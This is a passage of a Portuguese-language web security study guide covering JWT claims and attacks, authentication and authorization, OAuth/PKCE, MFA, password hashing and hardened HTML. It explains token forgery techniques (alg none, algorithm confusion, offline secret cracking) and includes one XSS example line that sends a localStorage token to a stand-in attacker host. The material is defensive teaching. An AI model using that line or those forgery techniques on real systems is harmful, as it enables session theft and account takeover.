| `exp` | *Expiration Time* (Expiração) | Timestamp Unix (*NumericDate*, em segundos) após o qual o token **deve ser rejeitado**. |
| `nbf` | *Not Before* (Não antes de) | Timestamp Unix antes do qual o token ainda não pode ser aceito. |
| `iat` | *Issued At* (Emitido em) | Timestamp Unix do momento em que o token foi gerado. Útil para invalidar tokens emitidos antes de uma troca de senha. |
| `jti` | *JWT ID* (Identificador único) | ID único do token (UUID/CSPRNG). Usado para prevenir ataques de repetição (*replay*) e implementar listas de revogação (*denylist*). |

##### Algoritmos de assinatura (JWA — RFC 7518): Simétricos vs. Assimétricos

| Família | Exemplos (`alg`) | Como assina | Como verifica | Quando usar |
|---|---|---|---|---|
| **Simétrica (HMAC)** | `HS256` (HMAC + SHA-256), `HS384`, `HS512` | Com um **segredo compartilhado** ($K$) | Com o **mesmo segredo** ($K$) | Monolitos ou quando o mesmo serviço emite e valida o token |
| **Assimétrica (RSA / ECDSA / EdDSA)** | `RS256` (RSA PKCS#1 v1.5), `PS256` (RSA-PSS), `ES256` (ECDSA P-256), `EdDSA` | Com a **chave privada** do servidor de autenticação | Com a **chave pública** (distribuída via endpoint JWKS — RFC 7517) | Arquiteturas de microsserviços, OAuth 2.0 / OIDC (os consumidores só têm a chave pública e não conseguem forjar tokens) |

**Exemplo prático (JWT codificado, decodificado e validado):**

Considere o seguinte JWT (JWS assinado com `HS256` usando um segredo de 256 bits em ambiente de laboratório):

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImtleS0yMDI2LTEwIn0.eyJpc3MiOiJodHRwczovL2F1dGgubG9qYS1maWN0aWNpYS50ZXN0Iiwic3ViIjoidXNyXzQ4MjEiLCJhdWQiOiJodHRwczovL2FwaS5sb2phLWZpY3RpY2lhLnRlc3QiLCJyb2xlIjoiY2xpZW50ZSIsImlhdCI6MTc5MzM1MjAwMCwiZXhwIjoxNzkzMzUyOTAwLCJqdGkiOiI4ZjNhOWMyMS00YjEwLTRkMmEtOWUxMS0wMDFhMmIzYzRkNWUifQ.S7x9_kLm2pQ8vR1tY4wZ6nB3cV5xM0aJ9dF2gH4jK8s
```

Ao separar pelo caractere `.` e decodificar as duas primeiras partes de Base64URL para UTF-8:

```json
// 1. Header decodificado:
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key-2026-10"
}

// 2. Payload decodificado (expira em 900 segundos = 15 minutos após iat):
{
  "iss": "https://auth.loja-ficticia.test",
  "sub": "usr_4821",
  "aud": "https://api.loja-ficticia.test",
  "role": "cliente",
  "iat": 1793352000,
  "exp": 1793352900,
  "jti": "8f3a9c21-4b10-4d2a-9e11-001a2b3c4d5e"
}
```

```javascript
// Como qualquer script no Console do DevTools decodifica o payload (SEM precisar da chave):
function decodificarPayloadJwt(token) {
  const base64Url = token.split('.')[1];
  const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
  const jsonPayload = decodeURIComponent(
    atob(base64)
      .split('')
      .map(c => '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2))
      .join('')
  );
  return JSON.parse(jsonPayload);
}
```

##### Possíveis problemas de segurança em JWT

1. **Ataque do algoritmo `none` (`"alg": "none"`):** a especificação JWS previu o identificador `"none"` para tokens cuja integridade já fosse garantida por outro meio. Bibliotecas antigas ou mal configuradas liam o campo `alg` do próprio Header enviado pelo cliente: o atacante decodificava o JWT, mudava `"role": "cliente"` para `"role": "admin"`, mudava `"alg": "none"` no header, removia a assinatura (deixando o ponto final: `header.payload.`) e o servidor aceitava o token forjado sem verificar assinatura!
2. **Confusão de algoritmo (`RS256` $\rightarrow$ `HS256`):** o servidor assina tokens com sua chave privada RSA (`RS256`) e disponibiliza a chave pública para verificação. Se a biblioteca de verificação não restringir os algoritmos permitidos, o atacante altera o header para `"alg": "HS256"` e assina o token via HMAC usando a **chave pública RSA** (que todo mundo conhece) como se fosse o segredo simétrico. O servidor desavisado lê `HS256` no header e usa sua própria chave pública como segredo HMAC, validando o token falso!
3. **Segredo HMAC fraco (força bruta offline):** como a assinatura já está no próprio token que o cliente recebe, um atacante que possua **um único JWT válido** assinado com `HS256` pode rodar ferramentas como `hashcat` (modo 16500) ou `john` totalmente **offline** (sem enviar nenhuma requisição ao servidor e sem acionar bloqueios de *rate limit*) testando milhões de senhas por segundo. Se o segredo for `"segredo123"` ou `"minha-empresa"`, a chave é quebrada em segundos e o atacante passa a forjar tokens para qualquer usuário.
4. **Ausência de validação de `exp`, `aud` e `iss`:** validar apenas a assinatura matemática não basta. Se o servidor não checar `exp`, tokens vazados valem para sempre; se não checar `aud`, um token gerado para um serviço de baixo privilégio (ex.: newsletter) pode ser usado na API financeira que compartilha o mesmo provedor de identidade (*Cross-Service Relay Attack*).
5. **Manipulação de parâmetros de cabeçalho (`jku`, `jwk`, `kid`):** alguns servidores buscam a chave de verificação dinamicamente a partir de campos do Header. Se o servidor confiar cegamente em `jwk` (chave pública embutida no próprio header pelo atacante) ou buscar a URL indicada em `jku` (*JWK Set URL*) sem *allowlist* (causando SSRF e aceitando a chave do atacante), ou concatenar `kid` (*Key ID*) em um caminho de arquivo (`../../dev/null`) ou query SQL, a verificação da assinatura é completamente contornada.
6. **Dados sensíveis no payload:** colocar CPF, número de cartão, hash de senha ou dados internos no payload de um JWS expõe esses dados a qualquer pessoa ou log que veja o token.
7. **Dificuldade de revogação (*stateless dilemma*):** se o usuário fizer logout, tiver o celular roubado ou for demitido, um JWT puro continuará sendo aceito pelos servidores até o horário do `exp`, pois não há consulta de sessão a cada requisição.
8. **Roubo de token no cliente via XSS:** armazenar JWTs em `localStorage` ou `sessionStorage` torna o token diretamente legível por qualquer payload de Cross-Site Scripting (XSS) — basta `fetch('https://atacante.test/?t=' + localStorage.getItem('token'))`.

##### Refresh Tokens, Rotação e Onde Armazenar Tokens no Cliente

Para resolver o dilema entre usabilidade (não pedir login a cada 10 minutos) e segurança (minimizar a janela de uso de um JWT vazado), utiliza-se a arquitetura de dois tokens:

- **Access Token (Token de Acesso):** curta duração (**5 a 15 minutos**). Usado para chamar as APIs de negócio.
- **Refresh Token (Token de Atualização):** longa duração (dias ou semanas), **opaco** (ou com `jti` persistido no banco). Usado **exclusivamente** no endpoint `/auth/refresh` para obter um novo *access token*.

**[RECOMENDAÇÃO]** Aplicar **Rotação de Refresh Token (*Refresh Token Rotation* — RFC 6819 / OAuth 2.0 Security Best Current Practice RFC 9700)**: cada vez que um *refresh token* $RT_1$ é usado, o servidor o invalida e emite um novo $RT_2$. Se alguém tentar usar $RT_1$ novamente (**detecção de reuso**), o servidor sabe que houve roubo de token e **revoga imediatamente toda a família de tokens daquela sessão**, forçando novo login.

**Onde armazenar tokens no navegador? (Comparativo crítico de prova)**

| Local de Armazenamento | Acessível via JS (vulnerável a exfiltração direta por XSS)? | Enviado automaticamente pelo navegador (risco de CSRF)? | Persistência ao recarregar a página (`F5`) | Recomendação de Segurança |
|---|---|---|---|---|
| **`localStorage` / `sessionStorage`** | **SIM** (`localStorage.getItem` lê o token em 1 linha) | Não (enviado manualmente no header `Authorization`) | Sim | **Inseguro para tokens sensíveis**; se houver qualquer XSS, o atacante copia o token e o usa de outra máquina. |
| **Memória JS (variável em *closure* / estado da aplicação)** | Apenas se o atacante injetar código dentro do mesmo escopo ou interceptar `fetch` | Não | **Não** (some no `F5`; exige *silent refresh* via cookie `HttpOnly`) | **Bom para Access Tokens** de curtíssima duração em SPAs. |
| **Cookie `Secure; HttpOnly; SameSite=Strict/Lax` (`__Host-`)** | **NÃO** (invisível para `document.cookie`) | Sim (exige proteção anti-CSRF + `SameSite`) | Sim | **Padrão ouro para Refresh Tokens e cookies de sessão** (ou padrão *BFF — Backend For Frontend*). |

##### Configuração segura

- **[REQUISITO]** Nunca confiar no campo `alg` vindo do header sem restringi-lo a uma **lista explícita (*allowlist*)** de algoritmos permitidos no servidor (rejeitar `none` e nunca misturar chaves públicas RSA com algoritmos HMAC).
- **[REQUISITO]** Para `HS256`, usar um segredo gerado por CSPRNG com no mínimo **256 bits (32 bytes)** de entropia (conforme RFC 7518, Seção 3.2). Para arquiteturas distribuídas, preferir algoritmos assimétricos (`RS256`, `ES256`, `EdDSA`).
- **[REQUISITO]** Validar obrigatoriamente a assinatura, `exp`, `nbf` (se presente), `iss` e `aud` em todas as rotas autenticadas.
- **[RECOMENDAÇÃO]** Definir `exp` curto para *access tokens* (5–15 min), não colocar dados sensíveis no payload, armazenar o *refresh token* em cookie `__Host-rt` com `Secure; HttpOnly; SameSite=Strict; Path=/auth/refresh` e implementar rotação com *denylist* em Redis para revogação de emergência.

```javascript
// Node.js (biblioteca 'jose' ou 'jsonwebtoken') — Verificação SEGURA de JWT
const jwt = require('jsonwebtoken');

function autenticarJwtSeguro(req, res, next) {
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ erro: 'Token ausente ou malformado' });
  }
  const token = authHeader.slice(7);

  try {
    const payload = jwt.verify(token, CHAVE_PUBLICA_RSA, {
      algorithms: ['RS256'],                        // TRAVA o algoritmo esperado!
      issuer: 'https://auth.loja-ficticia.test',    // Valida 'iss'
      audience: 'https://api.loja-ficticia.test',   // Valida 'aud'
      clockTolerance: 5                             // Tolerância de 5s para desvio de relógio
    });
    req.usuario = { id: payload.sub, role: payload.role };
    return next();
  } catch (err) {
    return res.status(401).json({ erro: 'Token inválido ou expirado' });
  }
}
```

---

<a id="s1-7-4"></a>
#### 1.7.4 Autenticação e autorização

**O que é:** embora frequentemente apareçam juntos, **autenticação** e **autorização** são conceitos distintos e sequenciais em segurança da informação:

- **Autenticação (*Authentication* — AuthN):** é o processo de **verificar a identidade** declarada por um usuário, dispositivo ou serviço. Responde à pergunta: **"Quem é você?"**.
- **Autorização (*Authorization* — AuthZ):** é o processo de **verificar se uma identidade já autenticada possui permissão** para executar determinada ação ou acessar determinado recurso. Responde à pergunta: **"O que você pode fazer?"** (ou *"Você tem acesso a este objeto específico?"*).

| Aspecto | Autenticação (AuthN) | Autorização (AuthZ) |
|---|---|---|
| Pergunta central | "Quem é você?" | "O que você tem permissão para fazer?" |
| Ordem de execução | Ocorre **primeiro** | Ocorre **depois** da autenticação |
| Mecanismos típicos | Senha, MFA, Passkeys/WebAuthn, certificado mTLS | RBAC (papéis/roles), ABAC (atributos/políticas), ACLs (listas de controle de acesso) |
| Código HTTP quando falha | **`401 Unauthorized`** *(apesar do nome histórico na RFC, significa "Não autenticado" — exige header `WWW-Authenticate`)* | **`403 Forbidden`** *(o servidor sabe quem você é, mas você não tem permissão para este recurso)* |

> [!IMPORTANT]
> **Pegadinha clássica de prova:** o status HTTP **`401 Unauthorized`** indica falha de **autenticação** (credencial ausente, inválida ou expirada). Quando o usuário já está autenticado (ex.: logado como `cliente`), mas tenta acessar `/admin/relatorios`, o código semanticamente correto é **`403 Forbidden`** (falha de **autorização**), conforme a **RFC 9110** (Seções 15.5.2 e 15.5.4).

**Para que serve:** garantir que apenas usuários legítimos ingressem no sistema (AuthN) e impor o **Princípio do Menor Privilégio** (*Principle of Least Privilege*), impedindo que um usuário acesse dados de outros usuários (autorização horizontal) ou funções administrativas (autorização vertical).

**Como funciona:**

##### 1. Esquemas de autenticação HTTP (`Authorization` e Cookies)

A **RFC 9110** define uma estrutura extensível baseada no header de resposta `WWW-Authenticate` (que informa ao cliente como se autenticar) e no header de requisição `Authorization: <esquema> <credencial>`:

- **HTTP Basic (**RFC 7617**):** concatena `usuario:senha` e codifica em Base64.
  ```http
  GET /relatorio HTTP/1.1
  Host: api.exemplo.test
  Authorization: Basic bWFyaWE6U2VuaGFG#3J0ZTIwMjY=
  ```
  Como Base64 é trivialmente reversível, o esquema `Basic` **equivale a enviar a senha em texto claro** a cada requisição. **[REQUISITO]** Nunca usar HTTP Basic sem HTTPS (TLS), e evitá-lo para sessões de usuários em navegadores (pois não tem fluxo nativo limpo de logout e a caixa de diálogo nativa do navegador é alvo de phishing).
- **HTTP Bearer (**RFC 6750**):** envia um token de portador (*bearer token* — "quem portar este token tem acesso"), como um JWT ou token opaco de OAuth 2.0:
  ```http
  GET /v1/pedidos HTTP/1.1
  Host: api.loja-ficticia.test
  Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
  ```
- **Sessão baseada em Cookie ([1.7.1](#s1-7-1) e [1.7.2](#s1-7-2)):** o navegador envia automaticamente `Cookie: __Host-sid=...`. É o mecanismo tradicional e mais robusto para aplicações web renderizadas no servidor ou SPAs que usam um *Backend For Frontend (BFF)*.

##### 2. OAuth 2.0 (Authorization Code + PKCE) e OpenID Connect (OIDC)

- **OAuth 2.0 (**RFC 6749** e **RFC 9700**):** é um framework de **delegação de autorização** (não foi criado originalmente para autenticação!). Permite que um usuário (*Resource Owner*) autorize uma aplicação (*Client*) a acessar recursos em um servidor (*Resource Server*) usando tokens emitidos por um servidor de autorização (*Authorization Server*), sem compartilhar sua senha.
- **PKCE (*Proof Key for Code Exchange* — RFC 7636):** extensão que protege o fluxo *Authorization Code* contra interceptação do código de autorização. Antes de redirecionar o usuário ao login, o cliente gera um segredo aleatório (`code_verifier`) e envia apenas o seu hash SHA-256 (`code_challenge`) na URL de autorização. Ao trocar o `code` pelo token no back-channel, o cliente precisa apresentar o `code_verifier` original. **[REQUISITO]** O fluxo **Authorization Code com PKCE** é o padrão obrigatório atual para aplicações web, SPAs e apps móveis (o antigo fluxo *Implicit* com token no `#fragment` da URL está **obsoleto** pela RFC 9700).
- **OpenID Connect (OIDC):** é uma camada de **autenticação (identidade)** construída sobre o OAuth 2.0 (usando o escopo `openid`). Além do `access_token` (para acessar APIs), o servidor emite um **`id_token`** (sempre um JWT assinado) contendo os dados de autenticação do usuário (`sub`, `name`, `email`, `amr`) e expõe o endpoint padronizado `/userinfo`.

##### 3. MFA / 2FA e WebAuthn / Passkeys

- **MFA (*Multi-Factor Authentication* — Autenticação Multifator) / 2FA:** exige a combinação de **dois ou mais fatores de categorias diferentes**:
  1. **Algo que você sabe** (conhecimento): senha, PIN.
  2. **Algo que você tem** (posse): aplicativo autenticador gerando código **TOTP** (*Time-based One-Time Password*, **RFC 6238** — código de 6 dígitos que muda a cada 30s com base em HMAC e no relógio), token de hardware (YubiKey).
  3. **Algo que você é** (inerência / biometria): impressão digital, reconhecimento facial.
  *(Nota: dois elementos da mesma categoria — ex.: senha + pergunta secreta — **não** configuram 2FA real! Além disso, códigos por **SMS** são desencorajados pelo NIST SP 800-63B devido a ataques de **SIM Swapping** e interceptação SS7).*
- **WebAuthn (*Web Authentication API* do W3C) e Passkeys (FIDO2):** padrão moderno que substitui ou complementa senhas usando **criptografia de chave pública**. No cadastro, o dispositivo do usuário (celular, computador ou chave de segurança física) gera um par de chaves: a **chave privada** nunca sai do hardware seguro (*TPM / Secure Enclave*) e é desbloqueada localmente por biometria ou PIN; o servidor guarda apenas a **chave pública**. No login, o servidor envia um desafio aleatório (*challenge*) e o navegador solicita ao autenticador que assine o desafio **incluindo a origem exata do site (`rpId`, ex.: `loja-ficticia.test`)**.
  - **Por que Passkeys são resistentes a phishing?** Mesmo que a vítima seja enganada por um site falso `loja-ficticia-login.com`, o navegador informará a origem real ao autenticador, que não encontrará chave vinculada àquele domínio falso e jamais assinará o desafio do site legítimo.

##### 4. Armazenamento seguro de senhas no servidor (Hashing com Salt)

Se um atacante conseguir ler o banco de dados (via SQL Injection ou vazamento de backup), as senhas dos usuários não podem ser descobertas.

- **Por que NUNCA guardar em texto claro ou criptografia reversível?** Se há uma chave de descriptografia no servidor, o invasor que compromete o servidor rouba a chave e descriptografa todas as senhas. Senhas devem ser processadas por uma função unidirecional (**hash**): na autenticação, o servidor aplica a mesma função à senha digitada e compara os hashes.
- **Por que MD5, SHA-1 e SHA-256 simples são INSEGUROS para senhas?** Funções de hash criptográfico gerais como SHA-256 foram projetadas em hardware para serem **extremamente rápidas**. Uma única placa de vídeo (GPU) moderna consegue calcular **dezenas de bilhões de hashes SHA-256 por segundo**, permitindo que um atacante quebre senhas de 8 a 10 caracteres por força bruta ou dicionário em minutos. Além disso, sem um modificador único, dois usuários com a mesma senha teriam o mesmo hash, permitindo ataques com tabelas pré-computadas (**Rainbow Tables**).
- **O papel do *Salt* e do *Pepper*:**
  - **Salt (Sal):** valor aleatório (gerado por CSPRNG, ex.: 16 bytes) **único para cada senha**, concatenado à senha antes do hash e armazenado no próprio banco de dados junto ao resultado. O *salt* inutiliza *Rainbow Tables* e impede saber se dois usuários têm a mesma senha.
  - **Pepper (Pimenta):** segredo criptográfico (ex.: chave HMAC) compartilhado por toda a aplicação, mas armazenado **fora do banco de dados** (em um cofre de segredos / HSM / variável de ambiente). Se apenas o banco vazar (ex.: SQLi), o atacante não consegue testar senhas sem o *pepper*.
- **Funções de derivação de chave (KDFs) próprias para senhas:** são funções projetadas para serem **propositalmente lentas** (ajustáveis por fator de custo de tempo) e, nas mais modernas, **intensivas em memória (*memory-hard*)** para neutralizar o paralelismo de GPUs e ASICs:

| Algoritmo | Tipo | Resistência a GPU/ASIC (Memory-Hard) | Status atual (OWASP Password Storage Cheat Sheet) |
|---|---|---|---|
| **Argon2id** (**RFC 9106**) | KDF moderna (vencedor da *Password Hashing Competition*) | **Alta** (combina resistência a ataques de canal lateral do Argon2i e resistência a GPU do Argon2d; configura memória $m$, iterações $t$ e paralelismo $p$) | **[RECOMENDAÇÃO PRIMÁRIA]** Padrão ouro atual (ex.: $m=19\text{ MiB}, t=2, p=1$ ou $m=46\text{ MiB}, t=1, p=1$). |
| **bcrypt** | Baseado na cifra Blowfish | Moderada (usa 4 KB de estado interno; fator de trabalho `cost` exponencial $2^{\text{cost}}$) | **Aceito para sistemas legados/atuais** com `cost >= 10` (preferencialmente `12`). **Atenção:** trunca senhas acima de **72 bytes**! |
| **scrypt** (**RFC 7914**) | KDF *memory-hard* | **Alta** | **Seguro e recomendado** quando Argon2id não estiver disponível. |
| **PBKDF2** (**RFC 8018**) | Baseado em HMAC iterado | **Baixa** (consome pouca memória; vulnerável a aceleração massiva em GPU) | Usar apenas quando exigido por conformidade governamental (FIPS 140), com no mínimo **600.000 iterações** para `PBKDF2-HMAC-SHA256`. |
| **MD5 / SHA-1 / SHA-256 simples** | Hash rápido de integridade | **Nula** | **PROIBIDO / INSEGURO para senhas.** |

**Exemplo prático (Hash com Argon2id e Middleware de Autorização):**

```python
# Python (pip install argon2-cffi) — Cadastro e verificação segura de senha
from argon2 import PasswordHasher
from argon2.exceptions import VerifyMismatchError

# Configuração recomendada OWASP (gera salt aleatório de 16 bytes automaticamente)
ph = PasswordHasher(time_cost=2, memory_cost=19456, parallelism=1)

# 1. No cadastro: a string gerada já embute algoritmo, parâmetros, salt e hash!
hash_para_salvar = ph.hash("SenhaSuperForte!2026")
# Exemplo de saída: "$argon2id$v=19$m=19456,t=2,p=1$c2FsdHlzYWx0eXNhbHQ$9vK8..."

# 2. No login:
def autenticar_senha(hash_do_banco: str, senha_digitada: str) -> bool:
    try:
        ph.verify(hash_do_banco, senha_digitada)
        if ph.check_needs_rehash(hash_do_banco):
            # Atualiza o hash no banco se os parâmetros de segurança subiram
            pass
        return True
    except VerifyMismatchError:
        return False
```

```javascript
// Node.js / Express — Separando Autenticação (401) de Autorização (403)
function exigirPapel(...papeisPermitidos) {
  return (req, res, next) => {
    // 1. Checagem de Autenticação (AuthN)
    if (!req.usuario) {
      return res.status(401).json({ erro: 'Não autenticado. Faça login.' });
    }
    // 2. Checagem de Autorização baseada em papel (RBAC — AuthZ)
    if (!papeisPermitidos.includes(req.usuario.role)) {
      return res.status(403).json({ erro: 'Acesso negado: permissão insuficiente.' });
    }
    return next();
  };
}
```

##### Possíveis problemas de segurança e Configuração segura

- **Enumeração de usuários:** responder *"E-mail não cadastrado"* vs. *"Senha incorreta"*, ou demorar 300 ms quando o usuário existe (porque rodou o Argon2id) e 2 ms quando o usuário não existe (*timing attack*).
  - **[REQUISITO]** Retornar sempre mensagem genérica (*"Credenciais inválidas"*) e, quando o e-mail não existir no banco, executar um hash fictício (*dummy hash*) para manter o tempo de resposta constante.
- **Força bruta e *Credential Stuffing*:** atacantes testam milhões de pares `email:senha` vazados de outros sites.
  - **[REQUISITO]** Implementar *rate limiting* por IP e por conta, bloqueio progressivo (*exponential backoff*), MFA (preferencialmente TOTP ou WebAuthn) e checagem de senhas comprometidas na criação/troca (ex.: API com *k-anonymity* do *Have I Been Pwned*).
- **Comparação insegura de segredos:** comparar tokens ou hashes com `==` comum pode vazar bytes por tempo de resposta; use comparação em tempo constante (`crypto.timingSafeEqual` no Node.js ou `hmac.compare_digest` no Python).

---

<a id="s1-8"></a>
### 1.8 HTML, CSS e JavaScript

Toda aplicação web executada no navegador apoia-se em três tecnologias padronizadas e complementares, frequentemente chamadas de **tríade do front-end**:

| Tecnologia | Papel Arquitetural | Padrão Oficial | Representação em Memória |
|---|---|---|---|
| **HTML** (*HyperText Markup Language*) | **Estrutura e Semântica** (significado do conteúdo, formulários, links, mídia) | WHATWG *HTML Living Standard* | **DOM** (*Document Object Model*) |
| **CSS** (*Cascading Style Sheets*) | **Apresentação e Layout** (cores, tipografia, posicionamento, responsividade) | W3C *CSS Specifications* | **CSSOM** (*CSS Object Model*) |
| **JavaScript** (ECMAScript) | **Comportamento e Lógica** (interatividade, requisições assíncronas, manipulação dinâmica) | ECMA-262 (TC39) + Web APIs (WHATWG/W3C) | *JS Heap* / *Execution Context* |

> [!WARNING]
> **Regra de ouro da segurança no front-end:** todo código HTML, CSS e JavaScript é baixado e executado na máquina do usuário, que tem **controle absoluto** sobre o próprio navegador (inclusive via Chrome DevTools — [Seção 2](./02a-devtools-network.md#s2)). Portanto, qualquer validação de formulário, ocultação visual de botões ou lógica de permissão feita no front-end serve apenas para **usabilidade (UX)**; a segurança real (autenticação, autorização, validação de dados e regras de negócio) **deve obrigatoriamente ser refeita e garantida no servidor**.

<a id="s1-8-1"></a>
#### 1.8.1 HTML (HyperText Markup Language)

**O que é:** o **HTML** (*HyperText Markup Language* — linguagem de marcação de hipertexto) é uma linguagem de marcação (e não de programação) que define a estrutura hierárquica e o significado semântico de um documento web por meio de elementos delimitados por *tags* (como `<header>`, `<main>`, `<form>`, `<input>`, `<script>`).

**Para que serve:** estruturar o documento para que o navegador o renderize corretamente, viabilizar a acessibilidade (leitores de tela dependem de tags semânticas como `<nav>`, `<button>` e `<label>`), permitir a indexação por motores de busca e coletar dados do usuário por meio de **formulários HTML**, além de declarar recursos externos e políticas de segurança no nível de elemento.

**Como funciona:**

Quando o navegador recebe a resposta HTTP com `Content-Type: text/html; charset=utf-8`, o **HTML Parser** tokeniza os bytes em caracteres, constrói uma árvore de elementos aninhados (o DOM — [1.9.1](#s1-9-1)) e dispara o download de sub-recursos referenciados (`<link>`, `<script>`, `<img>`, `<iframe>`).

Nos **formulários (`<form>`)**, os atributos controlam como os dados são empacotados e enviados ao servidor:
- `action`: URL de destino da submissão.
- `method`: verbo HTTP utilizado (no HTML puro, apenas `GET` ou `POST` — além de `dialog` para fechar modais `<dialog>`).
- `enctype`: formato de serialização do corpo em requisições `POST`:
  - `application/x-www-form-urlencoded` (padrão: `campo1=valor1&campo2=valor2`);
  - `multipart/form-data` (obrigatório quando há upload de arquivos com `<input type="file">`);
  - `text/plain` (envia sem codificação estruturada; nunca recomendado em produção).

##### Atributos HTML críticos para a segurança

1. **`autocomplete` em campos de formulário:**
   Controla como o navegador e os gerenciadores de senhas preenchem e salvam dados automaticamente:
   - `autocomplete="off"`: pede ao navegador para não armazenar nem sugerir valores anteriores no histórico do campo (recomendado para códigos descartáveis, dados médicos ou financeiros em terminais públicos — embora navegadores modernos ignorem `autocomplete="off"` especificamente para senhas a fim de incentivar o uso de gerenciadores de senhas).
   - `autocomplete="current-password"` (no login) e `autocomplete="new-password"` (no cadastro/troca de senha): ajudam o gerenciador de senhas do navegador a sugerir senhas fortes e só preencher credenciais quando a **origem real** da página coincidir com o domínio salvo (defesa importante contra phishing).
   - `autocomplete="one-time-code"`: indica campos de código MFA/2FA.
2. **`sandbox` em `<iframe>`:**
   Aplica o princípio do menor privilégio a documentos embutidos via `<iframe>`. Um `<iframe src="..." sandbox>` (com valor vazio) aplica **restrição máxima**: o conteúdo do iframe é tratado como uma origem opaca única (`null`), **não pode executar scripts**, não pode enviar formulários, não pode abrir pop-ups (`window.open`) e não pode navegar a janela principal (`top`). Permissões específicas são liberadas uma a uma:
   - `allow-scripts`: permite executar JavaScript dentro do iframe.
   - `allow-forms`: permite submissão de formulários.
   - `allow-popups`: permite abrir novas abas.
   - `allow-same-origin`: permite que o conteúdo mantenha sua origem real (acessando seus cookies e storage).
   > [!CAUTION]
   > **Armadilha clássica de prova e de arquitetura:** NUNCA combine `sandbox="allow-scripts allow-same-origin"` em um `<iframe>` que carregue conteúdo da **mesma origem** da página pai! Se o iframe tiver a mesma origem e puder rodar scripts, o JavaScript de dentro do iframe pode simplesmente acessar `window.frameElement.removeAttribute('sandbox')` na página pai, remover a própria jaula e recarregar-se sem restrições!
3. **`rel="noopener noreferrer"` em links externos (`<a target="_blank">`):**
   - `noopener`: impede que a página aberta em nova aba acesse a página original através da propriedade `window.opener` (prevenindo o ataque de **Reverse Tabnabbing** — [1.9.2](#s1-9-2)). *Nota:* navegadores modernos já aplicam `rel="noopener"` implicitamente em todo link com `target="_blank"` **[Varia por versão]**, mas declará-lo explicitamente continua sendo boa prática.
   - `noreferrer`: além de implicar `noopener`, omite o envio do header HTTP `Referer` na navegação para o site externo, evitando vazar a URL completa de origem (e eventuais parâmetros sensíveis na query string).
4. **Subresource Integrity (SRI — W3C):**
   Usa os atributos `integrity` e `crossorigin="anonymous"` em tags `<script>` e `<link rel="stylesheet">` carregadas de CDNs (Content Delivery Networks — redes de distribuição de conteúdo) de terceiros. O navegador calcula o hash criptográfico (SHA-256, SHA-384 ou SHA-512) do arquivo baixado e o compara com o valor esperado no atributo `integrity`. Se a CDN for invadida e o arquivo `.js` for adulterado com código malicioso (*supply-chain attack*), o hash não baterá e o navegador **bloqueará a execução**.

**Exemplo prático (HTML semântico e endurecido para segurança):**

```html
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Checkout Seguro — Loja Fictícia</title>
  <!-- Script de CDN externa protegido por Subresource Integrity (SRI) -->
  <script
    src="https://cdn.exemplo.test/libs/chart-4.4.0.min.js"
    integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
    crossorigin="anonymous"
    defer></script>
</head>
<body>
  <main>
    <form action="/api/transferencia" method="POST" autocomplete="off">
      <!-- Token anti-CSRF sincronizado com a sessão no servidor -->
      <input type="hidden" name="csrf_token" value="9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c">

      <label for="senha-atual">Confirme sua senha:</label>
      <input id="senha-atual" name="senha" type="password" autocomplete="current-password" required minlength="12">

      <label for="codigo-mfa">Código 2FA:</label>
      <input id="codigo-mfa" name="otp" type="text" inputmode="numeric" pattern="[0-9]{6}" autocomplete="one-time-code" required>

      <button type="submit">Confirmar Transferência</button>
    </form>

    <!-- Link externo com proteção de opener e privacidade de Referer -->
    <a href="https://parceiro-externo.test/regulamento" target="_blank" rel="noopener noreferrer">
      Ler regulamento externo
    </a>

    <!-- Iframe isolado em sandbox restritivo (sem allow-same-origin) -->
    <iframe src="https://widget-terceiro.test/mapa.html" sandbox="allow-scripts" title="Mapa"></iframe>
  </main>
</body>
</html>
```

##### Possíveis problemas de segurança e Configuração segura

- **HTML Injection e XSS ([Seção 3.2](./03a-vulnerabilidades-parte1.md#s3)):** concatenar entrada do usuário no HTML sem codificação de entidades (`<` $\rightarrow$ `&lt;`, `>` $\rightarrow$ `&gt;`, `"` $\rightarrow$ `&quot;`, `'` $\rightarrow$ `&#x27;`, `&` $\rightarrow$ `&amp;`) permite injetar tags falsas, formulários de phishing ou scripts.
- **Confiar em atributos de validação ou campos ocultos (`<input type="hidden">`):** um formulário com `<input type="hidden" name="preco" value="199.90">` ou `<input maxlength="10" required>` pode ser editado em 5 segundos na aba Elements do DevTools ou contornado via `fetch()`.
- **Formulários de escrita usando `method="GET"`:** expõe senhas e dados pessoais na URL, histórico do navegador, logs de proxy e header `Referer`.
- **Scripts de terceiros sem SRI:** comprometimento da CDN compromete instantaneamente todas as páginas que incluem aquele `<script>`.
- **[REQUISITO]** Escapar toda saída dinâmica conforme o contexto HTML; validar todos os campos no servidor; usar `method="POST"` para ações que alterem estado ou enviem dados sensíveis, acompanhado de proteção anti-CSRF.
- **[RECOMENDAÇÃO]** Exigir SRI (`integrity` + `crossorigin="anonymous"`) em todos os recursos estáticos carregados de domínios de terceiros; isolar iframes com `sandbox`.

---

<a id="s1-8-2"></a>
#### 1.8.2 CSS (Cascading Style Sheets)

**O que é:** o **CSS** (*Cascading Style Sheets* — folhas de estilo em cascata) é a linguagem declarativa que define a apresentação visual de documentos HTML (cores, fontes, espaçamentos, animações e layout responsivo).

**Para que serve:** separar o conteúdo estrutural (HTML) da camada visual, permitindo que o navegador construa o **CSSOM** (*CSS Object Model*) e o combine com o DOM para formar a **Render Tree** (árvore de renderização), calculando a geometria de cada elemento (*Layout/Reflow*) e pintando os pixels na tela (*Paint* e *Composite*).

**Como funciona:**

1. **Seletores:** apontam para quais elementos do DOM uma regra será aplicada — por tag (`button`), classe (`.alerta`), ID (`#menu`), hierarquia (`form > input`), pseudo-classes (`:hover`, `:focus`) ou **seletores de atributo** com correspondência de prefixo/sufixo/substring (ex.: `input[value^="a"]` seleciona todo `<input>` cujo atributo `value` no HTML comece com a letra `a`).
